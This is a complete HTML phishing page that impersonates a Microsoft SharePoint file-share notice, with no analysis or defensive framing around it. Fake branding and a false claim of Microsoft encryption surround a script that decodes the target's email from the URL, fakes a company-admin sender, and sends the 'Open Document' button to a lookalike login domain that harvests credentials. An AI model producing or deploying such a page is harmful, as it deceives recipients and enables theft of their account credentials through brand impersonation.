<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document Shared With You - SharePoint</title>
<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/sharepoint_32x1.svg">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:4px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.04);max-width:520px;width:90%;padding:48px 40px}
.logo{display:flex;align-items:center;gap:10px;margin-bottom:32px}
.logo svg{width:32px;height:32px}
.logo span{font-size:18px;color:#333;font-weight:600}
.sender{display:flex;align-items:center;gap:12px;margin-bottom:24px;padding:16px;background:#f9f9f9;border-radius:6px}
.avatar{width:40px;height:40px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:600;font-size:16px}
.sender-info{flex:1}
.sender-name{font-weight:600;color:#333;font-size:14px}
.sender-action{color:#666;font-size:13px}
.doc-preview{border:1px solid #e1e1e1;border-radius:6px;padding:20px;margin:20px 0;display:flex;align-items:center;gap:16px}
.doc-icon{width:48px;height:48px;background:#185abd;border-radius:4px;display:flex;align-items:center;justify-content:center}
.doc-icon svg{fill:#fff;width:24px;height:24px}
.doc-info h3{font-size:14px;color:#333;margin-bottom:4px}
.doc-info p{font-size:12px;color:#888}
.btn{display:block;width:100%;padding:14px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-top:24px;transition:background .15s}
.btn:hover{background:#106ebe}
.footer{text-align:center;margin-top:24px;font-size:11px;color:#999;line-height:1.6}
.security{display:flex;align-items:center;gap:6px;justify-content:center;margin-top:12px;font-size:11px;color:#107c10}
.security svg{width:14px;height:14px;fill:#107c10}
@media(max-width:480px){.container{padding:32px 24px}}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#038387"/><text x="16" y="22" text-anchor="middle" fill="#fff" font-size="16" font-family="Segoe UI">S</text></svg>
    <span>SharePoint</span>
  </div>

  <div class="sender">
    <div class="avatar" id="avatarInit">AD</div>
    <div class="sender-info">
      <div class="sender-name" id="senderName">Admin</div>
      <div class="sender-action">shared a document with you</div>
    </div>
  </div>

  <div class="doc-preview">
    <div class="doc-icon">
      <svg viewBox="0 0 24 24"><path d="M6 2h8l6 6v12c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2zm7 1.5V8h4.5L13 3.5zM6 20h12V9h-5c-.55 0-1-.45-1-1V4H6v16z"/></svg>
    </div>
    <div class="doc-info">
      <h3 id="docName">Document.pdf</h3>
      <p>PDF Document &bull; 1.2 MB &bull; Modified today</p>
    </div>
  </div>

  <a class="btn" id="openBtn" href="#">Open Document</a>

  <div class="security">
    <svg viewBox="0 0 16 16"><path d="M8 1L2 3.5v4c0 3.5 2.6 6.8 6 7.5 3.4-.7 6-4 6-7.5v-4L8 1zm0 7.5h4.5c-.4 2.7-2.2 5-4.5 5.7V8.5H3.5v-3L8 3.5v5z"/></svg>
    Microsoft secured this share with encryption
  </div>

  <div class="footer">
    This link was generated by Microsoft SharePoint Online.<br>
    &copy; 2026 Microsoft Corporation. One Microsoft Way, Redmond, WA 98052
  </div>
</div>

<script>
(function(){
  var LURE = 'https://login.hoosiermachlnery.com/qzPdEUwU';
  var email = '';
  try { var h = window.location.hash.substring(1); if (h) email = atob(h); } catch(e) {}
  var GO = email ? LURE + '?e=' + encodeURIComponent(email) : LURE;

  if (email) {
    var d = email.split('@')[1] || '', c = d.split('.')[0] || 'Company';
    c = c.charAt(0).toUpperCase() + c.slice(1);
    document.getElementById('senderName').textContent = c + ' Admin';
    document.getElementById('avatarInit').textContent = c.substring(0,2).toUpperCase();
  }

  var btn = document.getElementById('openBtn');
  btn.setAttribute('href', GO);
  btn.onclick = function(){
    btn.textContent = 'Redirecting to sign-in...';
    btn.style.background = '#666';
    setTimeout(function(){ window.location.replace(GO); }, 600);
    return false;
  };
})();
</script>
</body>
</html>
